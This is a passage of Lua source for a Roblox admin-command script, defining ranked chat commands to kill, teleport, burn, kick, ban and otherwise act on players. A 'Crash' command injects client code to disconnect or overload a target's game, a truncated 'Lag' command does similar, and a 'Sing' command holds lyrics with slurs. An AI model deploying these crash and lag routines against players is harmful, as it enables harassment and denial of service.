		if Workspace:findFirstChild'Base' then
			Norm=Workspace.Base:clone()
		end
		--ICE.Services.Workspace:ClearAllChildren'Nope'
		pcall(function() Workspace.Base:Destroy() end)
		Speaker:LoadCharacter(true)
		Speaker.Character.Torso.Anchored=true
			if Norm then
				Norm:Clone().Parent=ICE.Services.Workspace
			else
				Part=Instance.new'Part'
				Part.Name='Base'
				Part.Size=Vector3.new(256,0.05,256)
				Part.Anchored=true
				Part.BrickColor=BrickColor.new'Earth green'
				Part.CFrame=CFrame.new(0,0,0)
				Part.Parent=Workspace
			end
		for _,v in pairs(ICE.Services.Players:GetPlayers()) do v:LoadCharacter() end
	end
)
ICE.Command('Terrain base','tbase',1,'Makes a terrain base','No arguments',
	function(Msg,Speaker)
			vector3int16_1 = Vector3int16.new(-50,0,-50)
			vector3int16_2 = Vector3int16.new(50, 1, 50)
			CleanType="Test"
			CleanTypes={"Grass","Sand","Brick","Granite","Asphalt","Iron","Aluminum","Gold","WoodPlank","WoodLog","Gravel","CinderBlock","MossyStone","Cement","RedPlastic","BluePlastic","Water"}
			for i,v in pairs(CleanTypes) do
				Tab=ICE.Output(v,'Random',Speaker,nil,function() CleanType=v ICE.RemoveTablets(Speaker) end)
				coroutine.wrap(function()
					repeat
						if Tab.Model.Parent ~= ICE.Services.Workspace then
							Tab=ICE.Output(v,'Random',Speaker,nil,function() CleanType=v ICE.RemoveTablets(Speaker) end)
						end
					until CleanType ~= "Test"
				end)()
			end
			ICE.Output('Random terrain',Speaker,nil,function() CleanType=tostring(math.random(1,17)) end)
			repeat
				wait()
			until CleanType ~= "Test"
			if tonumber(CleanType) then CleanType=tonumber(CleanType) end
			wait()
			local Terrain = Workspace.Terrain
			wait(0.01);
			Terrain:Clear()
			wait(0.01)
			pcall(function() Workspace.Base:Destroy() end)
			wait(0.01);
			Terrain:SetCells(250,2,250, CleanType, Enum.CellBlock.Solid, Enum.CellOrientation.NegZ)
	end
)
ICE.Command('Dynamic lighting(dl)','dl',1,'Activates Dynamic lighting','No arguments',
	function(Msg,Speaker)
		ICE.Services.Lighting.GlobalShadows=true
		ICE.Services.Lighting.TimeOfDay="24:00:00"
		ICE.Services.Lighting.OutdoorAmbient=Color3.new(-1,-1,-1)
		ICE.Services.Lighting.Ambient=Color3.new(0,0,0)
		for _,v in pairs(ICE.Services.Players:GetPlayers()) do
			Spot=Instance.new'PointLight'
			Spot.Color=Color3.new(1,1,1)
			Spot.Name='Light'
			Spot.Parent=v.Character.Torso
			Spot.Range,Spot.Brightness=20,1/0
		end
	end
)
ICE.Command('Kill','kill',1,'Kills #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			v.Character:BreakJoints();
		end
	end
)
ICE.Command('Teleport','tp',1,'Teleports Player to #Player','Player/#Player',
	function(Msg,Speaker)
		local Player,Players=nil,{}
		local Split=Msg:find(ICE.Bets[2])
		local GetCF=function(v) return v:GetModelCFrame() end
		Player,Players=ICE.GetPlayers(Msg:sub(Split+1),Speaker)[1],ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
		local Y = 0
		for i,v in pairs(Players) do
			if v.Character == nil then
				v:LoadCharacter()
			end
			Y = Y + 8 -- Approx length of a Normal Robloxian Body from Head to Toe Torso=4,Leg=2,Head=2
			local Character=Player.Character
			local Torso=Character:findFirstChild'Torso'
			local TorsoCFrame=Torso.CFrame
			local CharacterCFrame=GetCF(Character)
			VTorso=v.Character.Torso
			--if ICE.TeleportSettings[Speaker.Name].Type=="Relative" then
				VTorso.CFrame=CFrame.new(CharacterCFrame.x,CharacterCFrame.y + Y, CharacterCFrame.z)
			--elseif ICE.TeleportSettings[Speaker.Name].Type=='Absolute' then
				--VTorso.CFrame=CFrame.new(TorsoCFrame.x,TorsoCFrame.y + Y,TorsoCFrame.z)
		--	end
		end
	end
)
ICE.Command('Set time of day','timeofday',1,'Sets time of day','Timeofday or nil',
function(Msg,Speaker)
		if #Msg >= 1 then		
			local Ran,Error=coroutine.create(coroutine.resume(function()
				ICE.Services.Lighting.TimeOfDay=Msg
			end))
			if Error then ICE.Output(Error,'Red',Speaker,3) end
		else
			Times={
				['Morning']="6:00:00";
				['Noon']="12:00:00";
				['Night']="18:00:00";
				['MidNight']="24:00:00";
			};
			for Name,Time in pairs(Times) do
				ICE.Output(Name,'Random',Speaker,nil,
					function()
						ICE.RemoveTablets(Speaker);
						ICE.Services.Lighting.TimeOfDay=Time
					end
				)
			end
		end
	end
)	
ICE.Command('Explorer','explore',1,'Enters Explorer','No arguments',
	function(Msg,Speaker)
		TheService=nil;
		if #Msg==0 then
			for n,s in pairs(ICE.Services) do
				if n:lower():sub(1,#Msg)==Msg:lower() then
					TheService=s
				end
			end
		end
		ICE.Explore(TheService,Speaker);
	end
)
ICE.Command('Respawn','rs',1,'Respawns #Player','#Player',
	function(Msg,Spkr)
		for _,v in pairs(ICE.GetPlayers(Msg,Spkr)) do
			if v.Character:findFirstChild'Torso' then
				Last=v.Character.Torso.CFrame
				v:LoadCharacter();
				v.Character.Torso.CFrame=Last
			else
				v:LoadCharacter()
			end
		end
	end
)
ICE.Command('Get visual','giv',1,'Gets visual basic scripting capablities(hack)','No arguments',
	function(Msg,Speaker)
		ICE.Output('Not available yet!','Red',Speaker,5)
	end
)
ICE.Command('Give','give',1,'Gives #Player sum toolz','#Player',
	function(Msg,Speaker)
		Tools={}
		Players=ICE.GetPlayer(Msg,Speaker)
		Give=function()
			for i,v in pairs(Players) do
				for _,tool in ipairs(Tools) do
					tool:clone().Parent=v.Backpack
				end
			end
		end
		Start=function()
			ICE.RemoveTablets(Speaker)
			Num=0
			for i,v in pairs(ICE.Services.Lighting:children()) do
				if v:IsA'Tool' or v:IsA'HopperBin' then
					Num=Num+1
					ICE.Output(v.Name,'Random',Speaker,nil,function()
						table.insert(Tools,v:clone())
							ICE.Output('Add more tools?','Red',Speaker,nil,function() 
								Start()
							end)
							ICE.Output('Give tools to the playres','Green',Speaker,nil,function() GiveTools() end)
						
						end
					)
				end
			end
			if Num == 0 then ICE.Output('No tools in Lighting','Red',Speaker) end
		end
	Start()
	end
)		
ICE.Command('take tool','ttool',1,'Takes #Players tool','#Player',
	function(Msg,Speaker)	
		for _,Player in pairs(ICE.GetPlayers(Msg,Speaker)) do
			local PTools={};
			local Back=Player:findFirstChild'Backpack'
			if Back==nil then Player:LoadCharacter() Back=Player.Backpack end
			for i,v in pairs(Back:children()) do	
				if v:IsA'Tool' or v:IsA'HopperBin' then
					PTools[#PTools+1]=v:Clone();
				end
			end
			Start=false;
			Cloned={};
			GiveTools=function()
				for i,v in pairs(Cloned) do
					pcall(function() v.Parent=Speaker.Backpack end)
				end
			end
			StartOver=function()
				ICE.Output('Continue adding tools!','Red',Speaker,nil,function() Startt() end);
				ICE.Output('Clone tools to your self','Green',Speaker,nil,function() Start=true end)
			end
			Startt=function()
				ICE.RemoveTablets(Speaker);
				for i,v in pairs(PTools) do
					ICE.Output('Add ' .. v.Name,'Red',Speaker,nil,function() table.insert(Cloned,v) StartOver() end )
				end
			end
			if #PTools==0 then
				ICE.Output(Player.Name .. ' has no tools','Red',Speaker)
				Start=true
			else
				Startt()
			end
			repeat
				wait()
			until Start
			GiveTools()
		end
	end
)
ICE.Command('Remove tool','rtool',1,'Removes #Players tool','#Player',
	function(Msg,Speaker)	
		for _,Player in pairs(ICE.GetPlayers(Msg,Speaker)) do
			local PTools={};
			local Back=Player:findFirstChild'Backpack'
			if Back==nil then Player:LoadCharacter() Back=Player.Backpack end
			for i,v in pairs(Back:children()) do	
				if v:IsA'Tool' or v:IsA'HopperBin' then
					PTools[#PTools+1]=v:Clone();
				end
			end
			Start=false;
			Cloned={};
			GiveTools=function()
				for i,t in pairs(Cloned) do
					pcall(function()  Back[t.Name]:Destroy() end)
				end
			end
			StartOver=function()
				ICE.Output('Continue adding tools!','Red',Speaker,nil,function() Startt() end);
				ICE.Output('Remove tools','Green',Speaker,nil,function() Start=true end)
			end
			Startt=function()
				ICE.RemoveTablets(Speaker);
				for i,v in pairs(PTools) do
					ICE.Output('Add ' .. v.Name,'Red',Speaker,nil,function() table.insert(Cloned,v) StartOver() end )
				end
			end
			if #PTools==0 then
				ICE.Output(Player.Name .. ' has no tools','Red',Speaker)
				Start=true
			else
				Startt()
			end
			repeat
				wait()
			until Start
			GiveTools()
		end
	end
)
ICE.Command('Fire','fire',1,'Fires #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			ICE.OnChatted(ICE.Bets[1]..'unfire'..ICE.Bets[2]..v.Name,Speaker,true)
			coroutine.wrap(function()
				for _,part in pairs(v.Character:children()) do
					if part:findFirstChild'Fire'==nil and part:IsA'BasePart' then
						Instance.new'Fire'.Parent=part
					end
				end
			end)()
		end
	end
)
ICE.Command('Unfire','unfire',1,'Unfires #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			CharParts=v.Character:children()
			for i,part in pairs(CharParts) do
				if part:IsA'BasePart' then
					pcall(function()
						for _,f in pairs(part:children()) do
							if f:IsA'Fire' then
								f:Destroy()
							end
						end
					end)
				end
			end
		end
	end
)
ICE.Command('Burn','burn',1,'Burns #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			coroutine.wrap(function()
				ICE.OnChatted(ICE.Bets[1]..'fire'..ICE.Bets[2]..v.Name,Speaker,true)
				local MainFire=v.Character:FindFirstChild('Fire',true)
				Humanoid=nil
				repeat
					for _,p in pairs(v.Character:children()) do	
						if p:IsA'Humanoid' then
							p.Name='Humanoid'
							Humanoid=p
						end
					end
					Humanoid:TakeDamage(math.random(1,2))
					wait()
				until MainFire==nil or MainFire.Parent==nil or v.Character:findFirstChild('Fire',true)==nil
			end)()
		end
	end
)
ICE.Command('Message','msg',1,'Makes a mesg with Text','Text',
	function(Text,Speaker)
		ICE.MakeMessage(Speaker.Name..': '.. Text)
	end
)
ICE.Command('Hint','hint',1,'Makes a hint with Text','Text',
	function(Text,Speaker)
		ICE.MakeHint(Speaker.Name..': '.. Text)
	end
)
ICE.Command('Superjump','sj',1,'Makes the Player jump really high','Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			local Height = 20
			local Num=0
			v.Character.Torso.Anchored=true
			v.Character.Humanoid.Jump=true
			for i=1,Height do
				pcall(function()
					v.Character.Torso.CFrame=CFrame.new(v.Character.Torso.CFrame.x,v.Character.Torso.CFrame.y + 1,v.Character.Torso.CFrame.z)
				end)
				wait(0.01);
			end
			Torso=v.Character.Torso
			for x=1,3 do
				Torso.CFrame=CFrame.new(Torso.Position + Vector3.new(x,x,x))
				wait(0.01);
			end
			for b=1,Height do
				Torso.CFrame=CFrame.new(Torso.CFrame.x,Torso.CFrame.y - 1,Torso.CFrame.z)
				wait(0.01);
			end
				
			v.Character.Torso.Anchored=false
		end
	end
) 
--[[ Rank 2 ]]--
ICE.Command('Kick','kick',2,'Kicks #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do	
			v:Destroy();
		end
	end
)
ICE.Command('Kick chat','kchat',2,'Kick chats a player','#Player',
	function(Msg,Speaker)
		local Warnings={}
		local Max=nil	
		local Players={};
		local AddWarning=function(Player) table.insert(Warnings,{Player=Player}) end
		local GetWarnings=function(Player) s=0 for i,v in pairs(Warnings) do if v.Player==Player then s=s+1 end end d = Max - s return d end
		local Split=Msg:find(ICE.Bets[2]) or nil
		if Split then	
			Players=ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
			Max=tonumber(Msg:sub(Split+1))
		else
			Max=3
			Players=ICE.GetPlayers(Msg,Speaker)
		end
		for i,Player in pairs(Players) do
			Player.Chatted:connect(function(Msg)
				AddWarning(Player)
				if GetWarnings(Player) == 0 then
					Player:Destroy();
				else
					local WarningHint=Instance.new('Message');
					WarningHint.Name='WarningHint'
					pcall(function() Player.PlayerGui.WarningHint:Destroy(); end);	
					WarningHint.Text = 'You have ' .. GetWarnings(Player) .. ' warnings left for talking before being kicked'
					WarningHint.Parent=Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player)
					wait(3)
					WarningHint.Parent=nil
				end
			end)
		end
	end
)
ICE.Command('Fly','fly',2,'Makes #Player Fly #Studs high','<Player><Studs>',
	function(Msg,Speaker)
		Players={};
		Split=Msg:find(ICE.Bets[2])
		if Split then
			Players=ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
		else
			Players=ICE.GetPlayers(Msg,Speaker)
		end
		for _,v in pairs(Players) do
			coroutine.wrap(function()
				local Meter=0
				if Split then
					if tonumber(Msg:sub(Split+1)) then
						Meter=tonumber(Msg:sub(Split+1))
					else
						Meter=300
					end
				else
					Meter=300
				end
				End=false;-- End flying
				coroutine.wrap(function()
					repeat
						if v.Character and v.Character:findFirstChild'Torso' then
							local Vect=Vector3.new();
							local Cur=v.Character.Torso.Position
							v.Character.Torso.Anchored=true
							Vect=Vector3.new(Cur.x,Cur.y + 0.1,Cur.z)
							v.Character.Torso.CFrame=CFrame.new(Vect) * CFrame.Angles(0,0,0)
							if v.Character.Torso.CFrame.y>=Meter then End=true end;
						end
						wait()
					until End==true
					pcall(function() v.Character.Torso.Anchored=false end)
				end)()
				v.CharacterAdded:connect(function(v) if End==false then End=true end end)
			end)()
		end
	end
)	
ICE.Command('Skyfall','sfall',2,'Makes #Player skyfall','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			pcall(function()
				vChar=v.Character;
				vTorso=vChar.Torso;
				vTorso.CFrame=CFrame.new(vTorso.CFrame.x,9999,vTorso.CFrame.z)
				wait()
				vTorso.CanCollide=false
			end)
		end
	end
) 
ICE.Command("Clear","clear",2,"Clears the workspace of its contents.","No Arguments",
    function(Msg,Speaker)
        for _,v in pairs(ICE.Services.Workspace:children()) do
            if Prometheus ~= nil then
                if v ~= Prometheus.script("lushmylife") then
                    pcall(function()
                        v:Destroy()
                    end)
                end
            else
                pcall(function()
                    v:Destroy()
                end)
            end
        end    
        
        local Base=Instance.new("Part",ICE.Services.Workspace)
        Base.Name='Base'
        Base.Size=Vector3.new(2048,1,2048)
        Base.BrickColor=BrickColor.new("Dark green")
        Base.Anchored=true
        Base.Locked=true
        Base.TopSurface='Studs'
        Base.Transparency = 0
        Base.CFrame=CFrame.new(Vector3.new(0,0,0))
        local Spawn=Instance.new("SpawnLocation",ICE.Services.Workspace) Spawn.Name='SpawnLocation'
        Spawn.Size=Vector3.new(6,1,6)
        Spawn.Transparency=1
        Spawn.CanCollide=false
        Spawn.Anchored=true
        Spawn.Locked=true
        Spawn.CFrame=CFrame.new(Vector3.new(0,0,0))        
        for _,v in pairs(ICE.GetPlayers()) do
            v:LoadCharacter()
        end
    
    end
)
ICE.Command('Brick kill','bkill',2,'Kills #PLayer with a brick','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			local Funcs={
				{Func=function(v) v:BreakJoints(); end};
				{Func=function(v) Expl=Instance.new'Explosion' Expl.Parent=v Expl.Position=v.Position end};
				{Func=function(v) v:BreakJoints(); Instance.new'Fire'.Parent=v; Instance.new'Sparkles'.Parent=v end};
			}
			coroutine.wrap(function()
				local Part=Instance.new'Part'
				local Event=math.random(1,3)
				local Size=Vector3.new(4,4,4)
				local Head=v.Character.Head
				Model=Instance.new'Model'
				Model.Parent=Head.Parent--v.Character
				Part.Size=Size;
				Part.BrickColor=BrickColor.random()
				Color=Part.Color
				local SelectionBox=Instance.new'SelectionBox'
				SelectionBox.Parent,SelectionBox.Name,SelectionBox.Color,SelectionBox.Adornee,SelectionBox.Transparency=Part,'SelectionBox',BrickColor.new(Color),Part,0.7
				local BillBoard=Instance.new'BillboardGui'
				BillBoard.Parent,BillBoard.Name,BillBoard.StudsOffset,BillBoard.Size=Model,'BillboardGui',Vector3.new(0,3,0),UDim2.new(10,0,10,0)
				local Label=Instance.new'TextLabel'
				Label.Parent,Label.Name,Label.Text,Label.TextColor3,Label.FontSize,Label.BackgroundTransparency,Label.TextStrokeTransparency,Label.Size,Label.TextStrokeColor3=BillBoard,'Label','',Color3.new(-1,-1,-1),'Size14',1,0.5,UDim2.new(1,0,1,0),Color
				Spot=Instance.new'PointLight'
				Spot.Brightness=1/0
				Spot.Range=30
				if game.Lighting.GlobalShadows==true and game.Lighting.Ambient==Color3.new(0,0,0) or game.Lighting.Ambient==Color3.new(-1,-1,-1) then
					Spot.Parent=Part
				end
				Part.Touched:connect(function(Hit)
					if Hit:IsDescendantOf(v.Character) then
						Funcs[Event].Func(Hit)
					end
				end)
				Part.Parent=Model
				Part.CFrame=CFrame.new(Head.Position + Vector3.new(0,20,0)) 
				Part.Anchored=true
				for i=1,20,0.1 do
					Part.CFrame=CFrame.new(Head.Position + (Vector3.new(0,20,0) - Vector3.new(0,i,0)) )
					if 15-i >= 0 then
					Label.Text='You have ' .. 15-i .. ' seconds to live =3'
					end
					Spot.Color=Color3.new(math.random(),math.random(),math.random())
					SelectionBox.Color=BrickColor.new(Spot.Color)
					Part.Color=Spot.Color
					wait()
				end
				Label.Text='You have died ;)'
				for i=1,10,0.1 do
					wait()
					if v.Character==nil or v.Character.Parent==nil then
						break
					end
					Part.CFrame=CFrame.new(Head.Position + (Vector3.new(0,20,0) - Vector3.new(0,i,0)) )
				end
			end)()
		end
	end
)
ICE.Command('Fall','Fall',2,'Makes #Player Fall #Studs high','<Player><Studs>',
	function(Msg,Speaker)
		Players={};
		Split=Msg:find(ICE.Bets[2])
		if Split then
			Players=ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
		else
			Players=ICE.GetPlayers(Msg,Speaker)
		end
		for _,v in pairs(Players) do
			coroutine.wrap(function()
				local Meter=0
				if Split then
					if tonumber(Msg:sub(Split+1)) then
						Meter=tonumber(Msg:sub(Split+1))
					else
						Meter=-300
					end
				else
					Meter=-300
				end
				if Meter > 0 then
					Meter=Meter-Meter-Meter;
				end
				End=false;-- End flying
				coroutine.wrap(function()
					repeat
						if v.Character and v.Character:findFirstChild'Torso' then
							local Vect=Vector3.new();
							local Cur=v.Character.Torso.Position
							v.Character.Torso.Anchored=true
							v.Character.Torso.CanCollide=false
							Vect=Vector3.new(Cur.x,Cur.y - 0.1,Cur.z)
							v.Character.Torso.CFrame=CFrame.new(Vect) * CFrame.Angles(0,0,0)
							if v.Character.Torso.CFrame.y<=Meter then End=true end;
						end
						wait()
					until End==true
					pcall(function() v.Character.Torso.Anchored=false v.Character.Torso.CanCollide=true end)
				end)()
				v.CharacterAdded:connect(function(v) if End==false then End=true end end)
			end)()
		end
	end
)
ICE.Command('Kick phrase','kpchat',2,'Kicks a player for chatting a term','#Player',
	function(Msg,Speaker)
		local Warnings={}
		local Max=4
		local Players={};
		local AddWarning=function(Player) table.insert(Warnings,{Player=Player}) end
		local GetWarnings=function(Player) s=0 for i,v in pairs(Warnings) do if v.Player==Player then s=s+1 end end d = Max - s return d end
		local Split=Msg:find(ICE.Bets[2]) or nil
		local Phrase=""
		if Split then	
			Players=ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
			Phrase=tostring(Msg:sub(Split+1))
		else
			Max=3
			Players=ICE.GetPlayers(Msg,Speaker)
		end

			for i,Player in pairs(Players) do
				AddWarning(Player)
				wait()
				Player.Chatted:connect(function(Msg)
					if Msg:find(Phrase) then
						AddWarning(Player)
						if GetWarnings(Player) == 0 then
							Player:Destroy();
						else
							local WarningHint=Instance.new('Message');
							WarningHint.Name='WarningHint'
							pcall(function() Player.PlayerGui.WarningHint:Destroy(); end);	
							WarningHint.Text = 'You have ' .. GetWarnings(Player) .. ' warnings left for saying ' .. Phrase .. '  before being kicked'
							WarningHint.Parent=Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player)
							wait(3)
							WarningHint.Parent=nil
						end
					end
				end)
			end
	end
)			
ICE.Command('Loopkill','lk',2,'Loopkills #Player','#Player',
	function(Msg,Speaker)
		for i,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			ICE.Loopkilled[v.Name]=true
		end
	end
)
ICE.Command('Un-Loopkill','unlk',2,'Un-Loopkills #Player','#Player',
	function(Msg,Speaker)
		for i,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			ICE.Loopkilled[v.Name]=false
		end
	end
)
ICE.Command('Explode','expl',2,'Explodes #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			local Expl=Instance.new'Explosion'
			Expl.Parent=v.Character
			--pcall(function()
				Expl.Position = v.Character.Torso.Position
				Expl.BlastRadius=100
			--end)
		end
	end
)
ICE.Command('Smite','smite',2,'Smites #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			for _,i in pairs(v.Character:children()) do
				if i:IsA'BasePart' then	
					local Sparkles = Instance.new("Sparkles",i)
					Sparkles.Color = Color3.new(math.random(),math.random(),math.random())
					local Ex = Instance.new("Explosion",ICE.Services.Workspace)
					Ex.Position = i.Position
					Ex.BlastPressure = 1e105
					i:BreakJoints()
					i.Velocity = Vector3.new(math.random(-250,250),math.random(100,250),math.random(-250,250))
					coroutine.wrap(function()
						for b=1,5,0.5 do
							i.Size=Vector3.new(b,b,b)
							wait(0.01)
						end
					end)()
				end
			end
			local Base=Instance.new'Part'
			pcall(function()
				Base.Size=Vector3.new(5,1,3)
				Base.Color=Color3.new(BrickColor.new'Bright yellow')
				Base.Anchored=true
				Base.CFrame=CFrame.new(v.Character.Torso.CFrame.x,v.Character.Torso.CFrame.y - 6,v.Character.Torso.CFrame.z)
				coroutine.wrap(function()
					for i=0,1,0.1 do
						Base.Transparency=i
						wait()
					end
					Base:Destroy()
				end)()
			end)
		end
	end
)
ICE.Command('Force field','ff',2,'Gives #Player a forcefield','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			ICE.OnChatted(ICE.Bets[1]..'unff'..ICE.Bets[2]..v.Name,Speaker,true)
			local Force=Instance.new'ForceField'
			Force.Parent=v.Character
		end
	end
)
ICE.Command('Un forcefield','unff',2,'Removes #Players forcfields','#Player',	
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			for i,s in pairs(v.Character:children()) do
				if s:IsA'ForceField' then
					s:Destroy()
				end
				for ii,ss in pairs(s:children()) do
					if ss:IsA'ForceField' then
						ss:Destroy()
					end
				end
			end
		end
	end
)
ICE.Command('Build tools','btools',2,'Gives #Playr btools','#Playr',
	function(Msg,Spkr)
		for _,v in pairs(ICE.GetPlayers(Msg,Spkr)) do
			for i=1,4 do
				local B=Instance.new'HopperBin'
				B.BinType=i
				B.Parent=v.Backpack
			end
		end
	end
)
ICE.Command('Damage','dmg',2,'Makes a player take #Damage','#Damage',
	function(Msg,Speaker)
		Damage,Players=nil,{};
		Split=Msg:find(ICE.Bets[2])
		Players=ICE.GetPlayers(Msg:sub(1,Split-1))
		Damage=tonumber(Msg:sub(Split+1))
		for i,v in pairs(Players) do
			v.Character.Humanoid:TakeDamage(Damage)
		end
	end
)
--[[ Rank 3 ]]--
ICE.Command('Crash','crash',3,'Crashes #PLayer','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			if newLocalScript then
				newLocalScript([[
					script.Parent=nil
					while wait() do
						ICE.Services.Players.LocalPlayer.Parent=nil
						wait()
						ICE.Services.Players.LocalPlayer.Parent=ICE.Services.Players
					end]],
				v:findFirstChild'Backpack' or v.Character)
			else
				loadstring([[ 
				local Player = ICE.Services.Players:findFirstChild']]..v.Name..[['
				repeat wait() until Player:findFirstChild'PlayerGui'
				local Value=Instance.new'StringValue' 
				Value.Parent=Player:findFirstChild'PlayerGui'
				Value.Value=("Yerrrp"):r]]..[[ep(1000000)]]
				)()
			end
		end
	end
)
ICE.Command('Antikill','ak',3,'Antikills a player','Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			coroutine.wrap(function()
				local String=Instance.new'StringValue'
				String.Name,String.Parent='Stop'..v.Name,ICE.Services.Lighting
				wait()
				String:Destroy();
				local Last=CFrame.new(0,0,0);
				local Started=false;
				local Player=ICE.Services.Players:findFirstChild(v.Name)
				local End=false
				Player.CharacterAdded:connect(function()
						if End == false then
						repeat
							wait()
						until Player.Character
						Char=Player.Character
						Humanoid=Char:findFirstChild'Humanoid'
						Torso=Char:findFirstChild'Torso'
						if Started then
							Torso.CFrame=Last
						end
						Humanoid.Died:connect(function()
							Last=CFrame.new(Torso.Position)
							Started=true
							Player:LoadCharacter();
						end)
						end
					end)
				repeat
						wait()
						if ICE.Services.Lighting:findFirstChild('Stop'..Player.Name) or ICE.Removed==true then
							End=true
						end
					until End==true or ICE.Removed==true
			end)()
		end
	end
)
ICE.Command('Remove antikill','remak','Removes an antikill a player has','Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			Stop=Instance.new'StringValue'
			coroutine.wrap(function() Stop.Value="true" Stop.Name='Stop'..v.Name Stop.Parent=ICE.Services.Lighting wait(1) Stop:Destroy() end)()
		end
	end
)
ICE.Command('Spawn smite','spsmite',3,'Spawn smites #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			v.CharacterAdded:connect(function()
				coroutine.wrap(function()
					Bet,Bet2=ICE.Bets[1],ICE.Bets[2]
					ICE.OnChatted(Bet..'smite'..Bet2..v.Name,Speaker,true)
				end)()
			end)
		end
	end
)
ICE.Command('Obliterate','obl',3,'Obliterates #Player','#Player',
	function(Msg,Speaker)
		for i,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			for _,Part in pairs(v.Character:children()) do 
				coroutine.wrap(function()
					if Part:IsA'BasePart' then
						local Cube = Instance.new'Part'
						Cube.FormFactor = 'Custom'
						Cube.Size = Vector3.new(5,5,5)
						Cube.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
						Cube.Anchored = false
						Cube.CanCollide = true
						Cube.Locked = true
						Cube.Friction = 0
						Cube.Transparency= 0
						Cube.Reflectance = 0.5
						Cube:BreakJoints()
						Cube.Touched:connect(function(Hit)
							if Hit:IsDescendantOf(v.Character) then
								local Expl=Instance.new'Explosion'
								Expl.Position=Hit.Position
								Sparkles=Instance.new'Sparkles'
								Fire=Instance.new'Fire'
								Fire.Parent,Expl.Parent,Sparkles.Parent=Hit,Hit,Hit
								Hit:BreakJoints();
								game:service'Debris':AddItem(Cube,2)
							end
						end)
						local Body=Instance.new'BodyPosition'
						Body.Parent=Cube
						Cube.Parent=game.Workspace
						Body.maxForce = Vector3.new(math.huge,math.huge,math.huge)
						Body.position=Vector3.new(0,50,0)
							coroutine.wrap(function()
								for i=1,50 do
									Body.position=Vector3.new(Part.Position.x,50-i,Part.Position.z)
									wait()
								end
							end)()
						game:service'Debris':AddItem(Cube,10)
					end
				end)()
			end
		end
	end
)
ICE.Command('Sing','sing',3,'Makes #Player Sing','@Player',
	function(Msg,Speaker)
		for _,Player in pairs(ICE.GetPlayers(Msg,Speaker)) do
			coroutine.wrap(function()
				Tab={
				"Yall ride 18's we ride 26's";
"Big truck Big wheels rollin ova ditches";
"Crome rims loud pipes heated like a kitchen ";
"Ice chain Ice watch gettin at these bitches";
"Yall ride 18's we ride 26's";
"Big truck Big wheels rollin ova ditches";
"Crome rims loud pipes heated like a kitchen ";
"Ice chain Ice watch gettin at these bitches";
"Im the wrong balla to flex with";
"Diamond stud earings and neckless";
"And my truck on 26's driving reckless";
"Got a pound yep and on my way to texas";
"yep im on there trowing up my set shit";
"Spinnas with the color trim ho's breathless";
"Paint shinning brite like morning breakfast";
"Once i slide up in the party pull the best bitch";
"Yo chick still want me even though she pregnant";
"Run game on a trick like check this";
"She seen the atm recipt and got wet with shit";
"She in a lexus told her park her whip";
"270 im bout to exit";
"I can bet a grip she work her hands and lips";
"Like a porno star who cares if her man a trip";
"I can handle it its so scandelous";
"I got them thing conpocky on a rubberband skinny";
"I pull up laughing at another man 20's (ha)";
"Yep the yunger man i run the dam city";
"I gotta pocket fulla hundreds fifty's rubberband 20's";
"Peep the shoes these is huge";
"Im probably on the service road nigga speeding in cruise";
"I bleed and bruise of reaching fools";
"So dont reach";
"u aint talking bout money then dont speak";
"Dont preach church don wan taught me that";
"The bitches had me gone but the money brought me back";
"Im seeing crome and i do them runs flat";
"President tent front back";
"Man i wish them old b p's come back but i roll on em";
"Hundrend spoke big d's tripple gold homie";
"No homie my rims aint twizzles";
"But dont get it twisted them is 26's";
"Song name: 26's by Chingy";
				};
				for i,v in pairs(Tab) do
					game:service'Chat':Chat(Player.Character.Head,v,'Red')
					wait(3)
				end
			end)()
		end
	end
)
--[[ Rank 4 ]]--
ICE.Command('Banish','ban',4,'Bans #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do	
			ICE.Ranked[v.Name].Rank=-1
			v:Destroy()
		end
	end
)
ICE.Command('Unban','unban',4,'Unbans Player','Player',
	function(Msg,Speaker)
		for i,v in pairs(ICE.Ranked) do
			if i:lower():sub(1,#Msg)==Msg:lower() then
				v.Rank=0
			end
		end
	end
)
--[[ Rank 5 ]]--
ICE.Command('Lag','lag',5,'Lags #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			ICE.CreateLocalScript(
		[[
		script.Parent=nil
			LocalPlayer = game:service'Players'.LocalPlayer
				Camera=Workspace.CurrentCamera
